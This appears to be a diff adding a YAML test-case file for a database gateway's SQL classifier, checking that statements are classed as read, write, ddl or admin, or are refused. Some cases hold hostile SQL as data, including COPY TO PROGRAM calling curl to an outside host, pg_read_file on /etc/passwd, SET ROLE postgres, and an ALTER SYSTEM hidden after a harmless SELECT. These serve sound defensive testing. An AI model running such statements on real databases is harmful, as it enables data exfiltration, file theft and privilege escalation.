@@ -1,0 +1,87 @@
+# Database lane (docs/06 §Database lane): each case is one statement as the gateway sees it. A
+# request to `<connection id>.db.aurora.internal` with path `/` and a body is classified by
+# `aurora-sqlclass`, the gateway's own classifier, and then selects the tool of its class path.
+- name: select is read
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SELECT id, name FROM customers WHERE id = 7" }
+  expect: { app: postgresql, class: read, tool: read }
+- name: show is read
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SHOW server_version" }
+  expect: { app: postgresql, class: read, tool: read }
+- name: explain without analyze is read
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "EXPLAIN SELECT * FROM customers" }
+  expect: { app: postgresql, class: read, tool: read }
+- name: read path selects read
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/read" }
+  expect: { app: postgresql, tool: read }
+- name: insert is write
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "INSERT INTO customers (name) VALUES ('Ada')" }
+  expect: { app: postgresql, class: write, tool: write }
+- name: select for update is write
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SELECT * FROM customers WHERE id = 1 FOR UPDATE" }
+  expect: { app: postgresql, class: write, tool: write }
+- name: data-modifying cte is write
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "WITH d AS (DELETE FROM customers RETURNING id) SELECT count(*) FROM d" }
+  expect: { app: postgresql, class: write, tool: write }
+- name: create table is ddl
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "CREATE TABLE notes (id int PRIMARY KEY, body text)" }
+  expect: { app: postgresql, class: ddl, tool: ddl }
+- name: drop and truncate are ddl
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "TRUNCATE customers" }
+  expect: { app: postgresql, class: ddl, tool: ddl }
+- name: vacuum is admin
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "VACUUM customers" }
+  expect: { app: postgresql, class: admin, tool: admin }
+- name: a function outside the allow-list is admin
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SELECT pg_terminate_backend(42)" }
+  expect: { app: postgresql, class: admin, tool: admin }
+- name: a multi-statement string takes its strictest class
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SELECT 1; DROP TABLE customers" }
+  expect: { app: postgresql, class: ddl, tool: ddl }
+- name: transaction control selects no tool and is never policy checked
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "BEGIN" }
+  expect: { app: postgresql, class: transaction }
+- name: alter system is always refused
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "ALTER SYSTEM SET work_mem = '1GB'" }
+  expect: { refused: statement_refused }
+- name: set role is always refused
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SET ROLE postgres" }
+  expect: { refused: statement_refused }
+- name: copy to a program is always refused
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "COPY customers TO PROGRAM 'curl http://example.test'" }
+  expect: { refused: statement_refused }
+- name: a file-reading function is always refused
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SELECT pg_read_file('/etc/passwd')" }
+  expect: { refused: statement_refused }
+- name: an unparsable statement is refused
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SELEKT 1" }
+  expect: { refused: statement_refused }
+- name: a refused statement hidden behind a harmless one is still refused
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SELECT 1; ALTER SYSTEM RESET ALL" }
+  expect: { refused: statement_refused }
+- name: "negative read: an insert is not a read"
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "INSERT INTO customers (name) VALUES ('Ada')" }
+  expect: { app: postgresql, tool: write }
+- name: "negative read: a locking select is not a read"
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SELECT * FROM customers FOR UPDATE" }
+  expect: { app: postgresql, tool: write }
+- name: "negative read: a GET is not a statement"
+  request: { method: GET, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/read" }
+  expect: { app: postgresql }
+- name: "negative write: a select is not a write"
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SELECT 1" }
+  expect: { app: postgresql, tool: read }
+- name: "negative write: a create is not a write"
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "CREATE INDEX i ON customers (name)" }
+  expect: { app: postgresql, tool: ddl }
+- name: "negative ddl: an update is not ddl"
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "UPDATE customers SET name = 'x'" }
+  expect: { app: postgresql, tool: write }
+- name: "negative ddl: an unknown class path selects nothing"
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/schema" }
+  expect: { app: postgresql }
+- name: "negative admin: a drop is not admin"
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "DROP TABLE customers" }
+  expect: { app: postgresql, tool: ddl }
+- name: "negative admin: a plain select is not admin"
+  request: { method: POST, url: "https://0190a1b2-0000-7000-8000-000000000001.db.aurora.internal/", body: "SELECT count(*) FROM customers" }
+  expect: { app: postgresql, tool: read }
